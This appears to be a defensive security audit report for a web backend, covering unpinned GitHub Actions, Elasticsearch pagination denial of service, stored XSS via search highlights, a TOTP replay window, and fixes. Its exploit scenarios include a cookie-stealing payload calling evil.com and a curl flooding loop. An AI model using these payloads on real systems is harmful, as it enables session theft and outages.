### RZ-W8-01

**Title:** deploy.yml GitHub Actions NOT SHA-pinned (supply chain attack vector)
**Severity:** CRITICAL | **CVSS:** 9.0 (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:N)
**File:** `.github/workflows/deploy.yml:34,37,43,225,247,250,255`

#### Impact

The production deployment workflow (`deploy.yml`) uses **mutable floating tags** (`@v4`, `@v5`) for three GitHub Actions used in every deploy job. Compare: the same file correctly SHA-pins `aws-actions/configure-aws-credentials` (line 167) and `actions/github-script` (line 195) — demonstrating awareness of the threat but inconsistent application.

GitHub tags are **not immutable**. Any organisation member (or a compromised account) with write access to the action repository can force-push a tag to a different commit SHA at any time. Supply-chain attacks via GitHub Actions have been confirmed in multiple real-world incidents (tj-actions/changed-files, reviewdog, etc.).

#### Exploit Scenario

```
1. Attacker compromises astral-sh/setup-uv GitHub account
2. Force-pushes v5 tag to a malicious commit that:
   a. Exfiltrates secrets.OIDC_DEPLOY_ROLE_ARN via curl to attacker-controlled host
   b. Modifies built binary before cosign signature
3. Next deploy picks up the poisoned action silently (no SHA mismatch warning)
4. Attacker now has valid AWS OIDC role ARN → lateral movement to cloud infra
```

#### Current State

### RZ-W8-02

**Title:** Elasticsearch deep-pagination DoS via unbounded `size`/`offset`
**Severity:** HIGH | **CVSS:** 7.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H)
**File:** `app/services/search.py:122-155`

#### Impact

The `search()` method passes `size` and `offset` directly into the Elasticsearch query body with **zero validation**. Elasticsearch's `from/size` pagination scans and ranks all documents from index 0 to `from + size` before discarding unwanted results. This is O(from + size) memory and CPU time.

#### Exploit Scenario

```bash
# Authenticated user spams search with deep pagination:
for i in $(seq 1 5); do
  curl -s "https://api.example.com/api/v1/search?q=test&limit=10000&offset=100000" &
done
# → 5 concurrent ES requests, each scoring 110,000 documents
# → ES peak memory: 5 × ~500 MB = 2.5 GB spike
# → ES heap OOM → circuit breaker → 503 for all users
```

#### Current State

```python
# app/services/search.py:122-130

    self,
    index: str,
    query: str,

    size: int = 20,
    offset: int = 0,
    highlight: bool = True,

    search_body: dict[str, Any] = {
        "query": {
            "multi_match": {
                "query": query,       # ← no length limit
                "fields": fields or ["*"],  # ← wildcard (see TD-W8-05)
                "type": "best_fields",
                "fuzziness": "AUTO",
            }
        },
        "size": size,    # ← direct passthrough, no bounds check
        "from": offset,  # ← direct passthrough, no bounds check
    }
```

### RZ-W8-03

**Title:** Elasticsearch highlights: stored XSS via raw HTML tag delimiters
**Severity:** HIGH | **CVSS:** 6.5 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)
**File:** `app/services/search.py:157-162`

#### Impact

The search highlighter uses `<mark>` and `</mark>` as pre/post delimiters. Elasticsearch's highlighter **does not HTML-escape the surrounding document content** — it only wraps matched text fragments. If a user-submitted document contains an HTML injection payload, the search API returns raw HTML in the highlights field.

If any frontend component renders highlights with `innerHTML`, `dangerouslySetInnerHTML`, or Trusted Types `createHTML` without re-sanitization, this becomes **stored Cross-Site Scripting**.

#### Exploit Scenario

```
1. Attacker creates a news article with title:
   "Test </mark><img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>"

2. Article is indexed into Elasticsearch.

3. Any user searching for "Test" receives:
   {
     "highlights": {
       "title": ["<mark>Test</mark> </mark><img src=x onerror='...'>"]
     }
   }

4. If the frontend renders: element.innerHTML = highlight
   → XSS fires on every user who searches for "Test"
   → Session cookie exfiltrated
```

#### Current State

```python
# app/services/search.py:157-162
if highlight:
    search_body["highlight"] = {
        "fields": {"*": {}},         # ← wildcard fields
        "pre_tags": ["<mark>"],      # ← HTML tag in raw content → XSS vector
        "post_tags": ["</mark>"],    # ← HTML tag in raw content → XSS vector
    }
```

#### Fix

Use **null-byte sentinel delimiters** that are impossible to confuse with HTML or inject via normal text input. The frontend escapes HTML first, then converts sentinels to safe `<mark>` tags.

```diff
+# Sentinel delimiters that cannot appear in normal user content (null bytes are
+# stripped by all standard input validators) and cannot be confused with HTML.
+# The frontend escapes all surrounding HTML *before* replacing these sentinels
+# with <mark> tags, preventing stored XSS via Elasticsearch highlights.
+_HIGHLIGHT_OPEN = "\x00MARK_OPEN\x00"
+_HIGHLIGHT_CLOSE = "\x00MARK_CLOSE\x00"

 if highlight:
     search_body["highlight"] = {
-        "fields": {"*": {}},
-        "pre_tags": ["<mark>"],
-        "post_tags": ["</mark>"],
+        # Explicit field list instead of wildcard — only search-visible fields
+        "fields": {field: {} for field in (fields or ["title", "content", "description"])},
+        "pre_tags": [_HIGHLIGHT_OPEN],
+        "post_tags": [_HIGHLIGHT_CLOSE],
+        "number_of_fragments": 3,
+        "fragment_size": 150,
     }
```

New frontend utility `frontend/src/utils/highlight.ts`:

```typescript
/**
 * Safely render an Elasticsearch highlight snippet as HTML.
 *
 * The backend uses null-byte sentinels instead of <mark> tags to prevent XSS
 * via raw HTML in indexed document content. This function:
 *   1. HTML-escapes ALL content (including surrounding text)
 *   2. Replaces escaped sentinels with safe <mark> tags
 *
 * NEVER pass highlight strings directly to innerHTML — always use this function.
 */
export function renderHighlight(raw: string): string {
  const escaped = raw
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#x27;");
  return escaped
    .replace(/\x00MARK_OPEN\x00/g, "<mark>")
    .replace(/\x00MARK_CLOSE\x00/g, "</mark>");
}
```

### RZ-W8-04

**Title:** `_enforce_production_secrets` missing guard for `ws_hub_internal_secret`
**Severity:** HIGH | **CVSS:** 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H)
**File:** `app/core/config/integrations.py:43-89`

#### Impact

The `_enforce_production_secrets` validator (R-01, Wave 5) checks three secrets but **omits `ws_hub_internal_secret`**. This field guards the `/internal/cache/invalidate` endpoint in ws-hub, which was added in Wave 3 (TD-NEW-07) to allow the backend to invalidate the ws-hub auth cache when a participant is removed from a chat.

If `WS_HUB_INTERNAL_SECRET` is deployed as an empty string (the field's default), the ws-hub endpoint accepts any request — or no auth at all — depending on how `hmac.compare_digest("", token)` behaves in the Go implementation.

#### Exploit Scenario

```
1. Operator deploys to production, forgets to set WS_HUB_INTERNAL_SECRET
2. ws_hub_internal_secret = "" (default from integrations.py:39-41)
3. Attacker on internal network (K8s pod with egress to service_net):
   POST http://ws-hub:8081/internal/cache/invalidate
   Authorization: Bearer anything
   { "user_id": "all-users-uuid", "room_id": "*" }
4. ws-hub clears ALL auth caches → all authenticated WebSocket connections
   lose cached auth → forced re-authentication → effective DoS for chat
5. Alternatively: invalid user_id forces reconnection loops
```

### RZ-W8-05

**Title:** TOTP `verify_totp_for_user` allows challenge-free invocation → 90-second replay window
**Severity:** MEDIUM | **CVSS:** 5.9 (AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N)
**File:** `app/auth/mfa/totp.py:251-260`

#### Impact

`verify_totp_for_user` accepts `challenge_token=None, challenge=None`. When called without a challenge, `consume_challenge` is never executed (lines 324-333 — guarded by `if loaded_challenge is not None`). A captured TOTP code is therefore valid for the entire ±30-second window (up to 90 seconds total across three windows checked by `_ct_verify_totp`).

The primary flow always uses challenges (preventing replay at the challenge level), but any **secondary code path** that calls `verify_totp_for_user(challenge_token=None)` creates a 90-second replay window.

#### Current State

```python
# app/auth/mfa/totp.py:251-260
async def verify_totp_for_user(
    db: AsyncSession,
    *,
    user: User,
    code: str,
    challenge_token: str | None = None,  # ← Optional — callers can skip
    challenge: MfaChallenge | None = None,
    session_id: UUID | None = None,
    locale: str | None = None,
) -> tuple[MfaTotpEnrollment, MfaChallenge | None]:
    # ...
    if loaded_challenge is not None:
        # Only consumes challenge if one was provided — no per-code tracking
        await consume_challenge(db, ...)
```

#### Fix

```diff
 async def verify_totp_for_user(
     db: AsyncSession,
     *,
     user: User,
     code: str,
-    challenge_token: str | None = None,
+    challenge_token: str,                # Required — no optional bypass
     challenge: MfaChallenge | None = None,
     session_id: UUID | None = None,
     locale: str | None = None,
 ) -> tuple[MfaTotpEnrollment, MfaChallenge | None]:
+    # Enforce challenge presence to guarantee per-code invalidation.
+    # Without a consumed challenge, the same TOTP code is valid for the full
+    # ±30s window (up to 90s) — a captured code could be replayed.
+    if not challenge_token and challenge is None:
+        raise ValueError(
+            "challenge_token is required for TOTP verification. "
+            "Omitting it leaves a 90-second replay window for captured codes."
+        )
```

Update all callers — they already pass `challenge_token` in the normal login flow. Any caller that doesn't pass a challenge is a potential security gap that should be fixed.

For belt-and-suspenders, also see [MOD-W8-06](#mod-w8-06) which adds last-used-code tracking to the DB model.

#### Verification

### RZ-W8-06

**Title:** Python 3.12 Docker base vs `requires-python = ">=3.13"` in `pyproject.toml`
**Severity:** MEDIUM | **CVSS:** 5.3 (AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)
**File:** `backend.Dockerfile:4,45`

#### Impact

`backend.Dockerfile` uses `python:3.12-slim-bookworm` for both builder and runtime stages. `pyproject.toml` declares `requires-python = ">=3.13"`. The lock file (`uv.lock`) was generated against Python 3.13. Running a Python 3.13-targeted virtualenv inside a 3.12 interpreter produces silent behaviour differences:

- C-extension ABIs differ between minor versions — some packages ship 3.13-specific wheels
- `asyncio.TaskGroup` exception semantics changed between 3.12 and 3.13
- `@override` type decorator (stdlib in 3.12+) — no issue here, but shows spec/runtime drift
- Security patches: Python 3.12 is in maintenance mode; 3.13 receives active security fixes

The stale executor comment (`security.py:39`) still references `ARGON2_MEMORY_COST_KIB=65536 uses 64 MB` but the actual constant is `32768` (32 MB). This misleads capacity planning.

#### Fix

```diff
-FROM python:3.12-slim-bookworm AS builder
+FROM python:3.13-slim-bookworm AS builder

 # ... (builder stage unchanged) ...

-FROM python:3.12-slim-bookworm AS runtime
+FROM python:3.13-slim-bookworm AS runtime
```

Also fix stale comment in `app/auth/security.py:39`:

### TD-W8-01

**Title:** `verify_password_sync` falls through to bcrypt on **any** Argon2 exception
**Severity:** HIGH | **CVSS:** 6.8
**File:** `app/auth/security.py:376-393`

#### Problem

The outer `except Exception` block logs a warning then **continues to execute** — falling through the `if hashed_password.startswith("$argon2"):` guard and invoking `_verify_legacy_bcrypt`. A password hash that starts with `$argon2` but is malformed (truncated, has invalid parameters, triggers an argon2-cffi internal error) would be sent to bcrypt for verification instead of returning `False`.

In practice, a legitimate `$argon2` hash will never be a valid bcrypt hash, so verification would return `False`. However:

1. The `_verify_legacy_bcrypt` function is called with the malformed `$argon2...` string as the "hashed_password" — bcrypt raises exceptions on invalid hash format, all of which are caught and return `False`. Safe in practice.
2. BUT: the code **reveals a code path that should not exist** — if a future refactor changes the bcrypt fallback behavior, this becomes a real bypass.
3. More importantly: the stale exception is **logged as "falling back to passlib"** which is historically inaccurate (passlib was removed) and misleading to incident responders.


### TD-W8-02

**Title:** `_get_cached_public_key_pem` blocks event loop under `threading.Lock`
**File:** `app/auth/security.py:519-546`

#### Problem

`_get_cached_public_key_pem` acquires `_public_key_cache_lock` (a `threading.Lock`) and then calls `serialization.load_pem_private_key()` — a blocking RSA key derivation (1–50ms). `decode_token()` calls this function **synchronously** from the async event loop (not via `run_in_executor`). On cold cache or after the cache is cleared, all concurrent JWT decode operations block waiting on this lock.

Related: when the cache reaches 32 entries it calls `_public_key_cache.clear()`, evicting ALL entries simultaneously. The next N requests all miss cache and race to the lock — a thundering herd.

#### Current State

```python
# app/auth/security.py:519-546
def _get_cached_public_key_pem(kid: str, private_key_pem: str) -> str:
    cache_key = kid or hashlib.sha256(private_key_pem.encode()).hexdigest()
    with _public_key_cache_lock:          # ← threading.Lock held during RSA op
        if cache_key not in _public_key_cache:
            if len(_public_key_cache) >= 32:
                _public_key_cache.clear()  # ← evicts ALL 32 entries at once
            key = serialization.load_pem_private_key(  # ← blocking RSA op under lock
                private_key_pem.encode(), password=None
            )
            _public_key_cache[cache_key] = key.public_key().public_bytes(...).decode()
    return _public_key_cache[cache_key]
```

#### Fix

```diff
 def _get_cached_public_key_pem(kid: str, private_key_pem: str) -> str:
     cache_key = kid or hashlib.sha256(private_key_pem.encode()).hexdigest()
+    # Fast path: GIL makes dict reads atomic in CPython — no lock needed.
+    if cache_key in _public_key_cache:
+        return _public_key_cache[cache_key]
     with _public_key_cache_lock:
+        # Double-check inside the lock.
         if cache_key not in _public_key_cache:
             if len(_public_key_cache) >= 32:
-                _public_key_cache.clear()
+                # LRU approximation: evict only the oldest entry (dict preserves
+                # insertion order in Python 3.7+). Avoids thundering herd from
+                # simultaneous cache misses after a full-clear.
+                oldest_key = next(iter(_public_key_cache))
+                del _public_key_cache[oldest_key]
             key = serialization.load_pem_private_key(
                 private_key_pem.encode(), password=None
             )
             _public_key_cache[cache_key] = (
                 key.public_key()
                 .public_bytes(
                     encoding=serialization.Encoding.PEM,
                     format=serialization.PublicFormat.SubjectPublicKeyInfo,
                 )
                 .decode()
             )
     return _public_key_cache[cache_key]
```

Add cache pre-warming to `app/core/lifespan.py` startup:

### TD-W8-04

**Title:** `get_search_service()` global singleton bypasses Dishka DI + client never closed
**File:** `app/services/search.py:272-286`

#### Problem

`_search_service` is a module-level global initialized outside the DI container. There is no `await close()` call in the application lifespan. `AsyncElasticsearch` holds a persistent HTTP connection pool; unclosed pools cause:
- `ResourceWarning: Unclosed client session` in logs
- 10–30s delay in `asyncio.run()` cleanup during graceful shutdown
- Potential K8s SIGKILL due to exceeding `terminationGracePeriodSeconds: 30`
- Connection exhaustion on the Elasticsearch cluster side

#### Fix

Create a Dishka provider:

```python
# app/core/providers/search_provider.py (new file)
from __future__ import annotations

from collections.abc import AsyncGenerator

from dishka import Provider, Scope, provide

from app.services.search import SearchService


class SearchServiceProvider(Provider):
    """Dishka provider for the Elasticsearch search service.

    Manages the AsyncElasticsearch connection pool lifecycle — ensures
    the pool is properly closed during application shutdown.
    """

    @provide(scope=Scope.APP)
    async def search_service(self) -> AsyncGenerator[SearchService, None]:
        from app.core.config import settings

        http_auth: tuple[str, str] | None = None
        if settings.elasticsearch_password:
            http_auth = (settings.elasticsearch_user, settings.elasticsearch_password)

        svc = SearchService(hosts=settings.elasticsearch_url, http_auth=http_auth)
        try:
            yield svc
        finally:
            await svc.close()
```

Register in `app/core/container.py`:

```diff
+from app.core.providers.search_provider import SearchServiceProvider

 container = make_async_container(
     ...,
+    SearchServiceProvider(),
 )
```

Replace all `get_search_service()` usages with DI injection.

#### Verification

On `SIGTERM`, logs should show Elasticsearch connection close message with no `ResourceWarning`. Shutdown should complete within `terminationGracePeriodSeconds`.

### MOD-W8-04

**Title:** Add `Content-Security-Policy-Report-Only` in production (shadow enforcement)
**File:** `app/core/security_headers.py`

The enforcing `Content-Security-Policy` header is already active. A `Content-Security-Policy-Report-Only` header (with a potentially more permissive policy) can run alongside it to:

1. Catch new violations from future third-party integrations before they're enforced
2. A/B test CSP policy changes safely in production
3. Detect XSS attempts in real time (reports go to `/api/v1/csp-report`)

```python
# In SecurityHeadersMiddleware.set_response_headers():
# Add alongside the existing enforcing CSP:
csp_report_only = build_csp_policy(
    settings,
    nonce=nonce,
    report_only=True,       # slightly relaxed — allows testing new sources
    report_uri="/api/v1/csp-report",
)
response.headers["Content-Security-Policy-Report-Only"] = csp_report_only
```

**Title:** Update Docker base to Python 3.13
**File:** `backend.Dockerfile:4,45`

Covered by [RZ-W8-06](#rz-w8-06). Listed here as a modernization tracking item.

- ~10–15% faster async task scheduling (asyncio event loop optimizations)
- JIT compiler opt-in: `PYTHON_JIT=1 uvicorn ...` speeds up hot Python paths (useful for zxcvbn, chat message processing)

- Active security support (vs. 3.12 maintenance-only)

### MOD-W8-06

**Title:** Add TOTP last-used-code tracking for belt-and-suspenders replay prevention
**File:** `app/auth/mfa/totp.py` + new Alembic migration

Even after [RZ-W8-05](#rz-w8-05) (requiring a challenge), the challenge-based protection relies on the challenge record being single-use. Add per-code tracking as a defense-in-depth layer:

#### New Alembic Migration

```python
# alembic/versions/202603150001_add_totp_last_used_code.py
def upgrade() -> None:
    op.add_column(
        "mfa_totp_enrollment",
        sa.Column("last_used_code_hash", sa.String(64), nullable=True),
    )
    op.add_column(
        "mfa_totp_enrollment",
        sa.Column("last_used_at", sa.DateTime(timezone=True), nullable=True),
    )

def downgrade() -> None:
    op.drop_column("mfa_totp_enrollment", "last_used_code_hash")
    op.drop_column("mfa_totp_enrollment", "last_used_at")
```

#### Code Change in `totp.py`

```python
# After finding matched_enrollment in verify_totp_for_user:
import hashlib as _hashlib

# Belt-and-suspenders: reject code if it matches the last used code.
# This closes the replay window even without a challenge (defense-in-depth).
code_hash = _hashlib.sha256(normalized_code.encode()).hexdigest()
if (
    matched_enrollment.last_used_code_hash is not None
    and hmac.compare_digest(matched_enrollment.last_used_code_hash, code_hash)
):
    raise_validation_error("errors.mfa.code_already_used", locale or "en")

# Record the used code hash (NOT the plaintext code)
matched_enrollment.last_used_code_hash = code_hash
matched_enrollment.last_used_at = _utcnow()
```
